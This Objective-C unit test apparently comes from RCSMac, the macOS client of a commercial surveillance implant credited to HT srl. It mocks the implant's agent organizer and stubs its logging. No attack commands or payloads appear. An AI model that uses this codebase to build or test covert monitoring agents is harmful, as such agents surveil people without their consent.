/*
 *  RCSMAgentOrganizerTest.m
 *  RCSMac
 *
 *
 *  Created by revenge on 2/9/11.
 *  Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>
#import <GHUnit/GHUnit.h>
#import <OCMock/OCMock.h>

#import "RCSMAgentOrganizer.h"
#import "RCSMLogger.h"
#import "RCSMDebug.h"

#define AGENT_ORGANIZER   0x0200


@interface RCSMAgentOrganizerTest : GHTestCase

@end

@implementation RCSMAgentOrganizerTest

- (BOOL)shouldRunOnMainThread
{
  // By default NO, but if you have a UI test or test dependent on running on the main thread return YES
  return NO;
}

- (void)setUpClass
{
  // Run at start of all tests in the class
}

- (void)tearDownClass
{
  // Run at end of all tests in the class
}

- (void)setUp
{
  // Run before each test method
}

- (void)tearDown
{
  // Run after each test method
}

- (void)antani: (NSNotification *)aNotification
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
#ifdef ENABLE_LOGGING
  if ([[aNotification name] isEqualToString: @"mockLog"])
    infoLog(@"mock object called on _logData for AgentOrganizer");
  
  if ([[aNotification name] isEqualToString: @"mockCreate"])
    infoLog(@"mock object called on create stub");
  
  if ([[aNotification name] isEqualToString: @"mockWrite"])
    infoLog(@"mock object called on create stub");
  
  if ([[aNotification name] isEqualToString: @"mockClose"])
    infoLog(@"mock object called on create stub");
#endif
  
  [outerPool release];
}

- (void)testAgent
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  id mock                   = [OCMockObject partialMockForObject:
                               [RCSMAgentOrganizer sharedInstance]];
  
  [[NSNotificationCenter defaultCenter] addObserver: self
                                           selector: @selector(antani:)
                                               name: @"mockLog"
                                             object: nil];
  
#ifdef MOCK_LOGGING
  NSNotification *notify = [NSNotification notificationWithName: @"mockLog"
                                                         object: nil];
  
  [[[[mock stub] andReturnValue: OCMOCK_VALUE(success)] andPost: notify] _logData: [OCMArg any]];
#endif
  [NSThread detachNewThreadSelector: @selector(start)
                           toTarget: mock
                         withObject: nil];
  
  [outerPool release];
}

@end